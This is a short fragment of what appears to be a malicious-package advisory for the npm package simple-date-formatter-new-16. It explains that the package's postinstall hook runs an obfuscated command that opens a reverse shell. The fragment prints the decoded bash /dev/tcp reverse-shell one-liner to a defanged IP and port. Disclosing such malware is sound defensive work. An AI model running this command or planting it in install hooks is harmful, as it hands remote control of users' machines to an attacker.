  "summary": "Malicious code in simple-date-formatter-new-16 (npm)",
  "details": "The postinstall hook executes a reversed-string bash command that decodes to `bash -i \u003e\u0026 /dev/tcp/124[.]221[.]154[.]135/4444 0\u003e\u00261`, opening an interactive reverse shell to 124[.]221[.]154[.]135:4444 on the installer's machine at install time. The package is a trivial date-formatter stub with no legitimate reason to open a network shell.",
